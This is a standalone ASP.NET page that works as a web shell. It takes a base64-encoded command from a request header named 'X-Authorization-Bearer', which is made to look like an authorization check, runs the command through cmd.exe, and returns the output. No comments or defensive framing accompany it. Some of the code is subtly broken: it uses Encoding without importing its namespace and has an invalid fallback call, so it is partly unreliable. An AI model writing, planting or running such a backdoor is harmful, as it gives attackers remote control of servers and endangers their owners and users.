<%@ Page Language="C#" Debug="false" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
void Page_Load(object sender, EventArgs e)
{
    string authHeader = Request.Headers["X-Authorization-Bearer"];
    if (string.IsNullOrEmpty(authHeader))
    {
        Response.StatusCode = 403;
        Response.Write("Forbidden");
        return;
    }

    string cmd = Encoding.UTF8.GetString(Convert.FromBase64String(authHeader));
    if (string.IsNullOrEmpty(cmd))
    {
        Response.StatusCode = 400;
        Response.Write("Invalid command");
        return;
    }

    Response.ContentType = "text/plain";
    Response.Write(ExecuteCommand(cmd));
}

string ExecuteCommand(string cmd)
{
    try
    {
        
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        Process process = new Process();
        process.StartInfo = psi;
        process.Start();

        string output = process.StandardOutput.ReadToEnd();
        string error = process.StandardError.ReadToEnd();

        process.WaitForExit();
        return !string.IsNullOrEmpty(output) ? output : error;
    }
    catch
    {
        try
        {
            
            return new StreamReader(new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c " + cmd,
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            }.Start().StandardOutput.BaseStream).ReadToEnd();
        }
        catch
        {
            return "Execution failed";
        }
    }
}
</script>